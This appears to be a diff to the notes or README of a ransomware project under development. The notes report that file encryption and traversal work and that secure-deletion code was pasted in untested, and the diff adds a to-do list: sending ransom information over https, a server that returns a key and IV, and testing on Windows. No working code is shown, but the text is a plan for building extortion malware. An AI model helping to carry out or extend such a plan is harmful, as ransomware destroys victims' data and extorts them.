@@ -13,3 +13,9 @@ Encryption and file traversal seems to be working.
 Need to test the whole secure deletion thing (shameless copy and pasted and not tested at all (audited the code and compiled...but never run...).
 
 Secure deletion code required some cleanup...so...yea...
+
+To do:
+
+-Add https via mongoose to send ransom info and receive key/iv.
+-Build simple server to accept ransom info and send back a random key/iv.
+-Test on Winblows.
